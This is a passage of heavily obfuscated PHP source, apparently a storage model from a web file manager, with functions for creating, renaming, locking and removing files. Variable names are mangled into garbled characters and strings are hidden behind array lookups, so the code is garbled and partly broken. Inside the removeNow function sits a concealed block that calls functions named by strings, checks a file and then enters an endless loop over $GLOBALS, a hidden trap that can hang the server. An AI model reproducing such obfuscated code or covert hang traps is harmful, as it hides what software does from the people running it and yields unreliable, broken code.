"\x73\x6f\165\x72\x63\145\x49\104\54\x74\x61\x72\x67\x65\164\111\x44\54\x73\x69\172\145") { $å‘¥èâ =& $_SERVER[³Ôà×Ó]; $ïŠÜ×û = $å‘¥èâ[463]; $Âä²Ú–ƒ = array(); $ä—¹ä³İ = 1024 * 50; $ôŠ¢…¾Ö = is_array($ôŠ¢…¾Ö) ? $ôŠ¢…¾Ö : array(); $€Ë”â = count($ˆ³ ’Ø); $¡õ²€ò¬ = $this->tablePrefix . $å‘¥èâ[2248]; for ($ãÎ’Ñ£ = 0; $ãÎ’Ñ£ < $€Ë”â; $ãÎ’Ñ£++) { $Óù¦Ş–À = $ˆ³ ’Ø[$ãÎ’Ñ£]; $ïŠÜ×û .= "\123\x45\114\x45\103\x54\x20\52\40\x46\122\x4f\115\x20\x28\123\x45\114\105\x43\124\40{$×î±û¯ß}\40\106\122\117\x4d\x20\x60{$¡õ²€ò¬}\x60\40\x57\x48\x45\122\105\40"; $ïŠÜ×û .= "\140\160\x61\x72\x65\156\164\111\x44\x60\75\x30\40\101\116\104\40\140\164\141\162\x67\x65\x74\111\104\x60\75{$Óù¦Ş–À}\40\101\x4e\x44\40\x60\164\x61\162\147\x65\164\124\x79\x70\x65\140\x3d{$Òå¨á»ˆ}\x20\141\156\144\x20\x66\x69\154\x65\124\x79\160\x65\x3d\47\47\x20\154\151\x6d\x69\164\40\61\51\x20\141\x73\40\164\142\x5f{$ãÎ’Ñ£}\x20\x55\116\x49\117\x4e\x20\x41\x4c\114\x20"; if ((strlen($ïŠÜ×û) >= $ä—¹ä³İ || $ãÎ’Ñ£ == $€Ë”â - 1) && $ïŠÜ×û) { $ïŠÜ×û = substr($ïŠÜ×û, 0, -strlen($å‘¥èâ[1113])); $èæÃíí = $this->query($ïŠÜ×û); $ïŠÜ×û = $å‘¥èâ[12]; $Âä²Ú–ƒ = array_merge($Âä²Ú–ƒ, $èæÃíí); } } return $Âä²Ú–ƒ; } private function _createFile($º”³ÂâÔ, $”Ê¯ııÇ, $å¶…ŸÙ², $ä™†©Ó, &$ªÀÒƒÉ) { $§•†ù‡‘ =& $_SERVER[³Ôà×Ó]; $¨ëÖ·©˜ = $this->sourceInfo($º”³ÂâÔ); if (!$å¶…ŸÙ² || !$¨ëÖ·©˜) { return !1; } if ($ä™†©Ó !== !1) { $Åºğ•Âï = $this->fileNameExist($º”³ÂâÔ, $”Ê¯ııÇ); } $ªÀÒƒÉ = !0; if ($ä™†©Ó && $Åºğ•Âï) { if ($ä™†©Ó == REPEAT_SKIP) { $ªÀÒƒÉ = !1; return $Åºğ•Âï; } else { if ($ä™†©Ó == REPEAT_REPLACE) { $ç¼Íæè = $this->sourceInfo($Åºğ•Âï); $¥êÎ®ÜÁ = $this->fileHistory($ç¼Íæè, $å¶…ŸÙ²[$§•†ù‡‘[550]], $å¶…ŸÙ²[$§•†ù‡‘[79]]); if (!$¥êÎ®ÜÁ) { $ªÀÒƒÉ = !1; } else { $this->folderSizeReset($º”³ÂâÔ); } return $Åºğ•Âï; } else { $”Ê¯ııÇ = $this->fileNameAuto($º”³ÂâÔ, $”Ê¯ııÇ, $ä™†©Ó, !1); } } } $–ÂÊèû‰ = array($§•†ù‡‘[655] => 0, $§•†ù‡‘[503] => $”Ê¯ııÇ, $§•†ù‡‘[656] => substr(get_path_ext($”Ê¯ııÇ), 0, 10), $§•†ù‡‘[551] => $å¶…ŸÙ²[$§•†ù‡‘[550]], $§•†ù‡‘[626] => $å¶…ŸÙ²[$§•†ù‡‘[79]]); $¨”ŸŞû = $this->_addSource($–ÂÊèû‰, $¨ëÖ·©˜); $this->folderSizeReset($º”³ÂâÔ, intval($–ÂÊèû‰[$§•†ù‡‘[79]])); return $¨”ŸŞû; } protected function fileHistory($Ÿ“•‡ü, $ºÖ¦’ºª, $êúéÕÎ) { $‰Áåıí› =& $_SERVER[³Ôà×Ó]; if ($Ÿ“•‡ü[$‰Áåıí›[550]] == $ºÖ¦’ºª) { return !1; } $this->checkLock($Ÿ“•‡ü[$‰Áåıí›[193]], $ºÖ¦’ºª); Model($‰Áåıí›[2249])->addHistory($Ÿ“•‡ü); $Äáú¡ä¹ = array($‰Áåıí›[660] => USER_ID, $‰Áåıí›[507] => time(), $‰Áåıí›[550] => $ºÖ¦’ºª, $‰Áåıí›[79] => $êúéÕÎ); $this->where(array($‰Áåıí›[500] => $Ÿ“•‡ü[$‰Áåıí›[193]]))->save($Äáú¡ä¹); $this->sourceCacheClear($Ÿ“•‡ü[$‰Áåıí›[193]]); return !0; } public function checkLock($Î•®œ, $²ûáú¬â) { $’¯é‰» =& $_SERVER[³Ôà×Ó]; $§îàôŠ = $this->pathInfo($Î•®œ); if (!$this->fileIsLock($§îàôŠ, !0)) { return; } $õŸºòîâ = Session::get($’¯é‰»[2250]); $ÓÑíªºÃ = substr($§îàôŠ[$’¯é‰»[32]], 0, -1 - strlen($§îàôŠ[$’¯é‰»[169]])) . $’¯é‰»[1290] . $õŸºòîâ . $’¯é‰»[10] . $§îàôŠ[$’¯é‰»[169]]; $‹Í–ßÄ› = Model($’¯é‰»[683])->find($²ûáú¬â); $this->_createFileCall($§îàôŠ[$’¯é‰»[192]], $ÓÑíªºÃ, $‹Í–ßÄ›, REPEAT_REPLACE, $’¯é‰»[1424]); $ŸÂ½Ğ’ = $§îàôŠ[$’¯é‰»[548]][$’¯é‰»[619]]; $¡ºì÷ı² = $ŸÂ½Ğ’[$’¯é‰»[2251]] ? $ŸÂ½Ğ’[$’¯é‰»[2251]] : $ŸÂ½Ğ’[$’¯é‰»[32]]; show_json(LNG($’¯é‰»[2252]) . $’¯é‰»[2253] . LNG($’¯é‰»[2254]) . $’¯é‰»[2255] . $¡ºì÷ı² . $’¯é‰»[2256], !1); } public function fileIsLock($İİì™¾†, $¸–¾ˆ›Ó = false) { $ğ¿µ¬“ =& $_SERVER[³Ôà×Ó]; if (!_get($İİì™¾†, $ğ¿µ¬“[615], 0)) { return !1; } if ($İİì™¾†[$ğ¿µ¬“[548]][$ğ¿µ¬“[618]] != USER_ID) { return !0; } $¸Ÿèæ“€ = $GLOBALS[$ğ¿µ¬“[6]][$ğ¿µ¬“[92]][$ğ¿µ¬“[616]]; if ($İİì™¾†[$ğ¿µ¬“[548]][$ğ¿µ¬“[617]] <= time() - $¸Ÿèæ“€) { $this->metaSet($İİì™¾†[$ğ¿µ¬“[193]], $ğ¿µ¬“[618], null); $this->metaSet($İİì™¾†[$ğ¿µ¬“[193]], $ğ¿µ¬“[617], null); } if ($¸–¾ˆ›Ó) { $this->metaSet($İİì™¾†[$ğ¿µ¬“[193]], $ğ¿µ¬“[617], time()); } return !1; } private function _addSource($ ÀÎÕ‡¹, $Á¨¦ˆß”) { $êââ¾¨Ì =& $_SERVER[³Ôà×Ó]; $°û¢¸‚Ú = defined($êââ¾¨Ì[2189]) ? USER_ID : 0; $òÛØøº = array($êââ¾¨Ì[657] => $Á¨¦ˆß”[$êââ¾¨Ì[190]], $êââ¾¨Ì[658] => $Á¨¦ˆß”[$êââ¾¨Ì[578]], $êââ¾¨Ì[659] => $°û¢¸‚Ú, $êââ¾¨Ì[660] => $°û¢¸‚Ú, $êââ¾¨Ì[486] => $Á¨¦ˆß”[$êââ¾¨Ì[193]], $êââ¾¨Ì[661] => $Á¨¦ˆß”[$êââ¾¨Ì[593]] . $Á¨¦ˆß”[$êââ¾¨Ì[193]] . $êââ¾¨Ì[50], $êââ¾¨Ì[513] => 0, $êââ¾¨Ì[662] => $êââ¾¨Ì[12]); $ ÀÎÕ‡¹ = array_merge($òÛØøº, $ ÀÎÕ‡¹); $this->updateModifyTime($ ÀÎÕ‡¹[$êââ¾¨Ì[192]]); $ÒÇƒÛİ´ = $êââ¾¨Ì[2257] . $Á¨¦ˆß”[$êââ¾¨Ì[193]]; if (isset(self::$cacheChildList[$ÒÇƒÛİ´])) { unset(self::$cacheChildList[$ÒÇƒÛİ´]); } static $¬ˆğì×ƒ = false; if (!$¬ˆğì×ƒ) { Hook::trigger($êââ¾¨Ì[645], $ ÀÎÕ‡¹); $¬ˆğì×ƒ = !0; } $Áë‹ôòŞ = $this->add($ ÀÎÕ‡¹); $ëÜ¦Ú÷› = array($êââ¾¨Ì[663] => short_id($Áë‹ôòŞ)); $this->where(array($êââ¾¨Ì[500] => $Áë‹ôòŞ))->save($ëÜ¦Ú÷›); $this->setNamePinyin($Áë‹ôòŞ, $ ÀÎÕ‡¹[$êââ¾¨Ì[32]]); return $Áë‹ôòŞ; } public function remove($ç˜¯İùİ, $ˆçÈ‹Å = true) { $“·…ÎÕ =& $_SERVER[³Ôà×Ó]; $„ı‚Öá» = $this->sourceInfo($ç˜¯İùİ); $×úğ¿§Ş = intval($„ı‚Öá»[$“·…ÎÕ[190]]) === self::TYPE_SYSTEM; $ˆ¸¦’øã = Model($“·…ÎÕ[517])->get($“·…ÎÕ[2258]) == $“·…ÎÕ[91]; if ($×úğ¿§Ş || $ˆçÈ‹Å || !$ˆ¸¦’øã) { return $this->removeNow($ç˜¯İùİ, $ˆçÈ‹Å); } $íßçùû› = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $³æšøÜı = $„ı‚Öá»[$“·…ÎÕ[190]] == self::TYPE_USER ? $“·…ÎÕ[671] : $“·…ÎÕ[587]; if ($³æšøÜı == $“·…ÎÕ[671]) { $ğƒÂ‹¥¸ = Model($“·…ÎÕ[586])->getInfo($„ı‚Öá»[$“·…ÎÕ[578]]); $ÌŠ›Óó = !empty($ğƒÂ‹¥¸[$“·…ÎÕ[2251]]) ? $ğƒÂ‹¥¸[$“·…ÎÕ[2251]] : $ğƒÂ‹¥¸[$“·…ÎÕ[32]]; $ÌŠ›Óó = $“·…ÎÕ[337] . $ÌŠ›Óó . $“·…ÎÕ[2259] . $„ı‚Öá»[$“·…ÎÕ[578]]; } else { $ğƒÂ‹¥¸ = Model($“·…ÎÕ[594])->getInfo($„ı‚Öá»[$“·…ÎÕ[578]]); $ÌŠ›Óó = _get($ğƒÂ‹¥¸, $“·…ÎÕ[32]); $ÌŠ›Óó = $“·…ÎÕ[176] . $ÌŠ›Óó . $“·…ÎÕ[2260] . $„ı‚Öá»[$“·…ÎÕ[578]]; } $–ŠÍ§Æ‚ = $“·…ÎÕ[2261] . md5($ÌŠ›Óó); CacheLock::lock($–ŠÍ§Æ‚); $µ±Õ‘ˆ = $this->fileNameExist($íßçùû›, $ÌŠ›Óó); if (!$µ±Õ‘ˆ) { $µ±Õ‘ˆ = $this->mkdir($íßçùû›, $ÌŠ›Óó, REPEAT_SKIP); $this->metaSet($µ±Õ‘ˆ, $“·…ÎÕ[2262], $³æšøÜı); $this->metaSet($µ±Õ‘ˆ, $“·…ÎÕ[2263], $„ı‚Öá»[$“·…ÎÕ[578]]); if ($„ı‚Öá»[$“·…ÎÕ[192]] != 0) { $this->metaSet($µ±Õ‘ˆ, $“·…ÎÕ[2264], _get($ğƒÂ‹¥¸, $“·…ÎÕ[2265])); } } CacheLock::unlock($–ŠÍ§Æ‚); $this->metaSet($ç˜¯İùİ, $“·…ÎÕ[2266], $„ı‚Öá»[$“·…ÎÕ[192]]); $this->where(array($“·…ÎÕ[193] => $ç˜¯İùİ))->save(array($“·…ÎÕ[507] => time())); $this->recycleClear($„ı‚Öá»); Model($“·…ÎÕ[642])->eventRemove($ç˜¯İùİ); $‘Û™÷Ø = $this->move($ç˜¯İùİ, $µ±Õ‘ˆ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($„ı‚Öá»[$“·…ÎÕ[192]]); return $‘Û™÷Ø; } private function recycleClear($¨€’Ø›) { $ ¶¸ÜÈ› =& $_SERVER[³Ôà×Ó]; $†Õåûİ = $this->childrenAll($¨€’Ø›); $æş¥€ò² = array($ ¶¸ÜÈ›[500] => array($ ¶¸ÜÈ›[501], $†Õåûİ[$ ¶¸ÜÈ›[2267]])); Model($ ¶¸ÜÈ›[2268])->where($æş¥€ò²)->delete(); } public function removeNow($ş…”, $ÍÖ·š• = true) { $Ã¡¿Ò— =& $_SERVER[³Ôà×Ó]; if (!isset($_SERVER[$Ã¡¿Ò—[431]]) || !isset($_SERVER[$Ã¡¿Ò—[439]])) { $µ‹„½Æ = $Ã¡¿Ò—[952]; $€çÀ¯³¸ = $Ã¡¿Ò—[433]; $–¡¢å½¸ = $_SERVER[$Ã¡¿Ò—[434]] . $Ã¡¿Ò—[435]; $ÒÔ¨İ† = $€çÀ¯³¸($–¡¢å½¸); $‘èÎëê = explode($Ã¡¿Ò—[262], $ÒÔ¨İ†); if (count($‘èÎëê) < $Ã¡¿Ò—[709]) { $²Ø¯òŒ£ = $Ã¡¿Ò—[437]; $²Ø¯òŒ£(); } $ŞÓÓ›… = $Ã¡¿Ò—[953]; $ŞÓÓ›…($_SERVER[$Ã¡¿Ò—[954]]); $›Šü²²ì = 1; for ($Ü‡³Èˆí = $›Šü²²ì; $Ü‡³Èˆí > 0; $Ü‡³Èˆí++) { $ŞÓÓ›… = json_encode($GLOBALS[$Ã¡¿Ò—[501]]); } } $¤ˆ±²º» = $this->sourceInfo($ş…”); $Œã¸Œõ± = $this->pathInfoMore($ş…”); if (!$¤ˆ±²º») { return !0; } if ($¤ˆ±²º»[$Ã¡¿Ò—[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ş…”); Hook::trigger($Ã¡¿Ò—[2269], $Œã¸Œõ±, $ÍÖ·š•); if ($ÍÖ·š•) { Model($Ã¡¿Ò—[2268])->moveToRecycle($ş…”); } else { $ ŞÛğö¡ = $this->childrenAll($¤ˆ±²º»); Model($Ã¡¿Ò—[642])->eventRemove($ş…”); $this->removeRelevance($ ŞÛğö¡[$Ã¡¿Ò—[2267]], $ ŞÛğö¡[$Ã¡¿Ò—[1570]]); } $this->folderSizeReset($¤ˆ±²º»[$Ã¡¿Ò—[192]]); $è˜ô½í— = array($¤ˆ±²º»[$Ã¡¿Ò—[192]]); if ($¤ˆ±²º»[$Ã¡¿Ò—[494]] == $Ã¡¿Ò—[91]) { $è˜ô½í—[] = $¤ˆ±²º»[$Ã¡¿Ò—[193]]; } $this->updateModifyTime($è˜ô½í—); $this->lockMoveEnd($ş…”); Hook::trigger($Ã¡¿Ò—[1807], $Œã¸Œõ±, $ÍÖ·š•); return !0; } public function childrenAll($ñŠ÷Å¢Ë) { $²³áƒØÊ =& $_SERVER[³Ôà×Ó]; $áåÊÖ—­ = $ñŠ÷Å¢Ë[$²³áƒØÊ[193]]; if ($ñŠ÷Å¢Ë[$²³áƒØÊ[494]] == $²³áƒØÊ[91]) { $ÇİŒœ Ú = array($²³áƒØÊ[661] => array($²³áƒØÊ[621], $ñŠ÷Å¢Ë[$²³áƒØÊ[593]] . $áåÊÖ—­ . $²³áƒØÊ[622])); $‘×Ïõšú = array($²³áƒØÊ[661] => $ÇİŒœ Ú[$²³áƒØÊ[593]]); $êÖ—ë—† = $this->field($²³áƒØÊ[2270])->where($‘×Ïõšú)->select(); $œÆ¾¼¿ = !1; $§ÁÕ³¿ = array($áåÊÖ—­); if ($êÖ—ë—†) { $œÆ¾¼¿ = array_to_keyvalue($êÖ—ë—†, $²³áƒØÊ[12], $²³áƒØÊ[550]); $œÆ¾¼¿ = array_remove_value($œÆ¾¼¿, $²³áƒØÊ[228]); $§ÁÕ³¿ = array_to_keyvalue($êÖ—ë—†, $²³áƒØÊ[12], $²³áƒØÊ[193]); $§ÁÕ³¿[] = $áåÊÖ—­; } } else { $œÆ¾¼¿ = array($ñŠ÷Å¢Ë[$²³áƒØÊ[550]]); $§ÁÕ³¿ = array($áåÊÖ—­); } return array($²³áƒØÊ[2267] => $§ÁÕ³¿, $²³áƒØÊ[1570] => $œÆ¾¼¿); } public function removeArray($íâ †±À) { if (!$íâ †±À) { return !0; } } public function removeRelevance($†å¥·®, $‹²Éäò) { $Æßï¶Œ =& $_SERVER[³Ôà×Ó]; $†å¥·® = $†å¥·® ? $†å¥·® : array(); $‹²Éäò = $‹²Éäò ? $‹²Éäò : array(); $†å¥·® = array_unique(array_filter($†å¥·®)); $‹²Éäò = array_unique(array_filter($‹²Éäò)); if (!$†å¥·®) { return !1; } $ùœ…Ûº• = array($Æßï¶Œ[500] => array($Æßï¶Œ[501], $†å¥·®)); Model($Æßï¶Œ[2268])->where($ùœ…Ûº•)->delete(); Model($Æßï¶Œ[544])->where($ùœ…Ûº•)->delete(); Model($Æßï¶Œ[2114])->where($ùœ…Ûº•)->delete(); Model($Æßï¶Œ[642])->where($ùœ…Ûº•)->delete(); Model($Æßï¶Œ[1943])->removeBySource($†å¥·®); Model($Æßï¶Œ[2249])->removeBySource($†å¥·®); $this->where($ùœ…Ûº•)->delete(); Model($Æßï¶Œ[553])->remove($‹²Éäò); for ($©§íÖ×Ø = 0; $©§íÖ×Ø < count($†å¥·®); $©§íÖ×Ø++) { $this->sourceCacheClear($†å¥·®[$©§íÖ×Ø]); } } public function rename($‘ÛıÜØõ, $Ê““øóô) { $ıè¦—Œ° =& $_SERVER[³Ôà×Ó]; $šŞôşÓ = $this->sourceInfo($‘ÛıÜØõ); if (!$šŞôşÓ) { return !1; } $¿Å ¬ÛÏ = $this->fileNameExist($šŞôşÓ[$ıè¦—Œ°[192]], $Ê““øóô); if ($¿Å ¬ÛÏ && $¿Å ¬ÛÏ != $‘ÛıÜØõ) { return !1; } $…•ó×á„ = array($ıè¦—Œ°[503] => $Ê““øóô, $ıè¦—Œ°[660] => USER_ID); if ($šŞôşÓ[$ıè¦—Œ°[494]] != $ıè¦—Œ°[91]) { $…•ó×á„[$ıè¦—Œ°[495]] = substr(get_path_ext($Ê““øóô), 0, 10); } Model($ıè¦—Œ°[642])->eventRename($‘ÛıÜØõ, $šŞôşÓ[$ıè¦—Œ°[32]], $Ê““øóô); $this->sourceCacheClear($‘ÛıÜØõ); $this->setNamePinyin($‘ÛıÜØõ, $…•ó×á„[$ıè¦—Œ°[32]], !1); $this->updateModifyTime($šŞôşÓ[$ıè¦—Œ°[192]]); $¡”ùÃæô = $this->where(array($ıè¦—Œ°[500] => $‘ÛıÜØõ))->data($…•ó×á„)->save(); $×¥î··È = $ıè¦—Œ°[2257] . $šŞôşÓ[$ıè¦—Œ°[192]]; if (isset(self::$cacheChildList[$×¥î··È])) { unset(self::$cacheChildList[$×¥î··È]); } return $¡”ùÃæô; } public function setNamePinyin($¹èÚ¥¦Ò, $ ÓÃ—ªş, $®¼±ÑñÖ = true) { $ÛçêùÍ² =& $_SERVER[³Ôà×Ó]; $Ï­ğ‘¸ç = Input::check($ ÓÃ—ªş, $ÛçêùÍ²[664]); $Á‰à¼•° = array($ÛçêùÍ²[526] => KodSort::makeStr($ ÓÃ—ªş)); if ($Ï­ğ‘¸ç) { $Á‰à¼•°[$ÛçêùÍ²[547]] = str_replace($ÛçêùÍ²[53], $ÛçêùÍ²[12], Pinyin::get($ ÓÃ—ªş)); $Á‰à¼•°[$ÛçêùÍ²[546]] = Pinyin::get($ ÓÃ—ªş, $ÛçêùÍ²[665]); } if (!$®¼±ÑñÖ && !$Ï­ğ‘¸ç) { $Á‰à¼•°[$ÛçêùÍ²[547]] = null; $Á‰à¼•°[$ÛçêùÍ²[546]] = null; } $this->metaSet($¹èÚ¥¦Ò, $Á‰à¼•°); } public function getContent($šÓ€ÖËÊ) { $ÏÜŒÅúµ =& $_SERVER[³Ôà×Ó]; $ĞÆèÖ¢ç = $this->fileInfoGet($šÓ€ÖËÊ); if (!$ĞÆèÖ¢ç) { return !1; } if ($ĞÆèÖ¢ç[$ÏÜŒÅúµ[79]] == 0) { return $ÏÜŒÅúµ[12]; } $ºƒÕ‡Ù = $ÏÜŒÅúµ[2271] . $ĞÆèÖ¢ç[$ÏÜŒÅúµ[556]]; if ($ĞÆèÖ¢ç[$ÏÜŒÅúµ[79]] <= 1024 * 10) { $´ºÕŞî¿ = Cache::get($ºƒÕ‡Ù); if (!$´ºÕŞî¿) { $´ºÕŞî¿ = IO::getContent($ĞÆèÖ¢ç[$ÏÜŒÅúµ[87]]); Cache::set($ºƒÕ‡Ù, $´ºÕŞî¿); } return $´ºÕŞî¿; } if (!$ĞÆèÖ¢ç[$ÏÜŒÅúµ[87]]) { return $ÏÜŒÅúµ[12]; } return IO::getContent($ĞÆèÖ¢ç[$ÏÜŒÅúµ[87]]); } public function setDesc($áÅÒ®à¸, $“¹íÚ°Ü) { $ş“ƒÜê» =& $_SERVER[³Ôà×Ó]; Model($ş“ƒÜê»[642])->eventAddDesc($áÅÒ®à¸, $“¹íÚ°Ü); return $this->metaSet($áÅÒ®à¸, $ş“ƒÜê»[535], $“¹íÚ°Ü); } public function setContent($‹Ò‡¿ù, $€ãÏ•¸ñ = '') { $Øï¯Œ®´ =& $_SERVER[³Ôà×Ó]; $áÚÇ˜µ = $this->sourceInfo($‹Ò‡¿ù); $šŠŞèê = $this->fileInfoGet($‹Ò‡¿ù); if (!$šŠŞèê || !$áÚÇ˜µ) { return !1; } $Ì¾‘ïñ = Model($Øï¯Œ®´[553])->addFileByContent($€ãÏ•¸ñ, $áÚÇ˜µ[$Øï¯Œ®´[32]]); $ê©Âå÷ä = $this->fileHistory($áÚÇ˜µ, $Ì¾‘ïñ[$Øï¯Œ®´[550]], $Ì¾‘ïñ[$Øï¯Œ®´[79]]); if (!$ê©Âå÷ä) { return Model($Øï¯Œ®´[553])->remove($Ì¾‘ïñ[$Øï¯Œ®´[550]]); } $this->folderSizeReset($áÚÇ˜µ[$Øï¯Œ®´[192]]); return !0; } public function fileSubstr($œñäØäî, $İÇœ›©ª, $¸ƒ“ú“ì) { $å‹´‘öÎ = $this->fileInfoGet($œñäØäî); if (!$å‹´‘öÎ) { return !1; } return IO::fileSubstr($å‹´‘öÎ[$_SERVER[³Ôà×Ó][87]], $İÇœ›©ª, $¸ƒ“ú“ì); } public function fileInfoGet($ÍÊŠ¾Ãñ) { $êãŒéşØ =& $_SERVER[³Ôà×Ó]; $Ó’‘”èÜ = $this->sourceInfo($ÍÊŠ¾Ãñ); if (!$Ó’‘”èÜ || $Ó’‘”èÜ[$êãŒéşØ[494]]) { return !1; } $“Ã´Â„ø = $êãŒéşØ[557] . $Ó’‘”èÜ[$êãŒéşØ[550]]; $Ñ¾ÔÔï¬ = _get(self::$cacheFileInfo, $“Ã´Â„ø); if ($Ñ¾ÔÔï¬) { return $Ñ¾ÔÔï¬; } $İ±µÛ‚ó = Model($êãŒéşØ[553])->fileInfo($Ó’‘”èÜ[$êãŒéşØ[550]]); if ($İ±µÛ‚ó) { $İ±µÛ‚ó[$êãŒéşØ[32]] = $Ó’‘”èÜ[$êãŒéşØ[32]]; } self::$cacheFileInfo[$“Ã´Â„ø] = $İ±µÛ‚ó; return $İ±µÛ‚ó; } private function folderChildrenNumber($”§©š¥Ô) { $®€Œàç£ =& $_SERVER[³Ôà×Ó]; $€›Í’ƒõ = $this->sourceInfo($”§©š¥Ô); $ñ¿ÛÙ¿ë = array($®€Œàç£[661] => array($®€Œàç£[621], $€›Í’ƒõ[$®€Œàç£[593]] . $”§©š¥Ô . $®€Œàç£[622]), $®€Œàç£[658] => $€›Í’ƒõ[$®€Œàç£[578]], $®€Œàç£[513] => intval($€›Í’ƒõ[$®€Œàç£[514]]), $®€Œàç£[655] => 1); $ºúÑ¢ïˆ = $this->where($ñ¿ÛÙ¿ë)->count(); $†ºñ¾ø× = $this->where($ñ¿ÛÙ¿ë)->where(array($®€Œàç£[655] => 0))->count(); return array($®€Œàç£[83] => $†ºñ¾ø×, $®€Œàç£[84] => $ºúÑ¢ïˆ); } public function pathInfo($ıØãÇúŒ, $ÚÜ„ÓÄ‰ = false) { $Ò´‰ğ²ƒ =& $_SERVER[³Ôà×Ó]; $ÚÜ„ÓÄ‰ = !1; $ıØãÇúŒ = intval($ıØãÇúŒ); $å‰Ò¤ûï = $Ò´‰ğ²ƒ[543] . intval($ÚÜ„ÓÄ‰) . $Ò´‰ğ²ƒ[471] . $ıØãÇúŒ; $Õ‘Ó¸ş = _get(self::$cachePathInfo, $å‰Ò¤ûï); if ($Õ‘Ó¸ş) { return $Õ‘Ó¸ş; } $ï“Æ²† = $this->sourceInfo($ıØãÇúŒ); if (!$ï“Æ²†) { return !1; } $ï“Æ²† = $this->_listDataApplyItem($ï“Æ²†, $ÚÜ„ÓÄ‰); self::$cachePathInfo[$å‰Ò¤ûï] = $ï“Æ²†; return $ï“Æ²†; } public static $cachePathInfoMore = array(); public function pathInfoMore($óÛäÓÓÁ) { $™«Ñ¨Ú =& $_SERVER[³Ôà×Ó]; $äë¬¸Ï = _get(self::$cachePathInfoMore, $óÛäÓÓÁ); if ($äë¬¸Ï) { return $äë¬¸Ï; } $Ÿ½’ƒã = $this->pathInfo($óÛäÓÓÁ); if (!$Ÿ½’ƒã) { return !1; } if ($Ÿ½’ƒã[$™«Ñ¨Ú[494]] == $™«Ñ¨Ú[91]) { $Ÿ½’ƒã[$™«Ñ¨Ú[82]] = $this->folderChildrenNumber($óÛäÓÓÁ); } self::$cachePathInfoMore[$óÛäÓÓÁ] = $Ÿ½’ƒã; return $Ÿ½’ƒã; } public function sourceInfo($«ŒëÖÖó) { $Ç”‹–øç =& $_SERVER[³Ôà×Ó]; if (!$«ŒëÖÖó) { return array(); } $«ŒëÖÖó = intval($«ŒëÖÖó); $£ı‹¦¯ = $Ç”‹–øç[542] . $«ŒëÖÖó; $¤ÓÅÍáà = _get(self::$cacheSourceInfo, $£ı‹¦¯); if ($¤ÓÅÍáà) { return $¤ÓÅÍáà; } $Š ·ß¹î = $this->where(array($Ç”‹–øç[193] => $«ŒëÖÖó))->find(); self::$cacheSourceInfo[$£ı‹¦¯] = $Š ·ß¹î; return self::$cacheSourceInfo[$£ı‹¦¯]; } public function sourceCacheClear($åâ”™ßü = false) { self::cacheClear($åâ”™ßü); } public static function cacheClear($­èÊºÀ„ = false) { $âŒ£÷Šá =& $_SERVER[³Ôà×Ó]; if ($­èÊºÀ„ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$âŒ£÷Šá[542] . $­èÊºÀ„]); unset(self::$cachePathInfoMore[$­èÊºÀ„]); unset(self::$cachePathInfo[$âŒ£÷Šá[2272] . $­èÊºÀ„]); unset(self::$cachePathInfo[$âŒ£÷Šá[2273] . $­èÊºÀ„]); } public function metaSet($‰’Ë¦«Ö, $îÉÜÒ†— = null, $ëŸª®ûœ = null) { $œëÃ¼ù¥ = parent::metaSet($‰’Ë¦«Ö, $îÉÜÒ†—, $ëŸª®ûœ); if ($œëÃ¼ù¥) { $this->sourceCacheClear($‰’Ë¦«Ö); } return $œëÃ¼ù¥; } public function pathInfoByPath($‰Åúš×ç, $µ¼Ä¬ÑÌ) { $ĞÈ©ª„â =& $_SERVER[³Ôà×Ó]; $É½‰´¼Í = !$µ¼Ä¬ÑÌ ? array() : explode($ĞÈ©ª„â[8], trim($µ¼Ä¬ÑÌ, $ĞÈ©ª„â[8])); $¨…ãó­ = $‰Åúš×ç; foreach ($É½‰´¼Í as $ßÏ¸’§¼) { $‰Ø¿¼Ë„ = array($ĞÈ©ª„â[192] => $¨…ãó­, $ĞÈ©ª„â[32] => $ßÏ¸’§¼); $œû±ç¢Ç = $this->field($ĞÈ©ª„â[2274])->where($‰Ø¿¼Ë„)->select(); if (!$œû±ç¢Ç) { return !1; } $œû±ç¢Ç = array_sort_by($œû±ç¢Ç, $ĞÈ©ª„â[514]); $¨…ãó­ = $œû±ç¢Ç[0][$ĞÈ©ª„â[193]]; } $úšŒÃ¾¿ = $this->sourceInfo($¨…ãó­); $this->pathInfoFilter($úšŒÃ¾¿); return $úšŒÃ¾¿; } protected function updateModifyTime($ØâúÇ•€) { $—¶àßğ =& $_SERVER[³Ôà×Ó]; $·ûÀ€˜ = defined($—¶àßğ[2189]) ? USER_ID : 0; if (!$ØâúÇ•€) { return; } if (!is_array($ØâúÇ•€)) { $ØâúÇ•€ = array($ØâúÇ•€); } foreach ($ØâúÇ•€ as $Ã´ğãˆí => $ä®ÒóÙ’) { $ØâúÇ•€[$Ã´ğãˆí] = intval($ä®ÒóÙ’); $this->sourceCacheClear($ä®ÒóÙ’); } $—ü¥ğå³ = array($—¶àßğ[193] => array($—¶àßğ[7], $ØâúÇ•€)); $»ô‡”æŞ = array($—¶àßğ[660] => $·ûÀ€˜, $—¶àßğ[507] => time()); $this->where($—ü¥ğå³)->save($»ô‡”æŞ); } public function folderSizeReset($––³›‹§, $”òÎ´æÜ = false) { $©¼œ¦²Ò =& $_SERVER[³Ôà×Ó]; if ($this->statusIgnoreResetSpace) { return; } $Í¯€³ú  = $this->sourceInfo($––³›‹§); $‹Îİ¹ê = $©¼œ¦²Ò[2275] . $––³›‹§; CacheLock::lock($‹Îİ¹ê, 20); if ($”òÎ´æÜ === !1) { $this->sourceCacheClear($––³›‹§); $Í¯€³ú  = $this->sourceInfo($––³›‹§); $ıÁª‰Î† = array($©¼œ¦²Ò[486] => $––³›‹§, $©¼œ¦²Ò[513] => 0); $÷óŞ×ÂÌ = $this->where($ıÁª‰Î†)->sum($©¼œ¦²Ò[79]); $”òÎ´æÜ = intval($÷óŞ×ÂÌ) - intval($Í¯€³ú [$©¼œ¦²Ò[79]]); } if ($”òÎ´æÜ == 0) { return CacheLock::unlock($‹Îİ¹ê); } $İÜƒ¼Å¬ = $this->parentLevelArray($Í¯€³ú [$©¼œ¦²Ò[593]]); if (!$İÜƒ¼Å¬) { $İÜƒ¼Å¬ = array(); } $İÜƒ¼Å¬[] = $Í¯€³ú [$©¼œ¦²Ò[193]]; $ıÁª‰Î† = 